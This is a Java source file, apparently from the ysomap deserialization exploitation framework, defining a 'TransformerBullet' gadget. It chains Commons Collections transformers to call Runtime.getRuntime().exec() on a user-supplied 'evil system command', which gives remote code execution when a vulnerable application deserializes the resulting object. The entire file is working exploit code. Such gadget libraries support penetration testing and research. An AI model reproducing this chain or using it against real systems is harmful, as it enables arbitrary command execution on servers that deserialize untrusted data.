package ysomap.gadget.bullet.collections;

import ysomap.annotation.Authors;
import ysomap.annotation.Dependencies;
import ysomap.annotation.Require;

import java.util.LinkedList;

/**
 * @author wh1t3P1g
 * @since 2020/2/16
 */
@SuppressWarnings ( "rawtypes" )
@Dependencies({"*"})
@Authors({ Authors.WH1T3P1G })
public class TransformerBullet extends AbstractTransformerBullet {

    @Require(name="args",detail="evil system command")
    public String args;

    @Override
    public Object getObject() throws Exception {
        initClazz();
        LinkedList<Object> transformers = new LinkedList<>();
        transformers.add(createConstantTransformer(Runtime.class));
        transformers.add(createInvokerTransformer("getMethod",
                new Class[] {String.class, Class[].class }, new Object[] {"getRuntime", new Class[0] }));
        transformers.add(createInvokerTransformer("invoke",
                new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }));
        transformers.add(createInvokerTransformer(
                "exec", new Class[] { String.class }, new String[]{args}));
        transformers.add(createConstantTransformer(1));

        return createTransformerArray(transformers);
    }

}
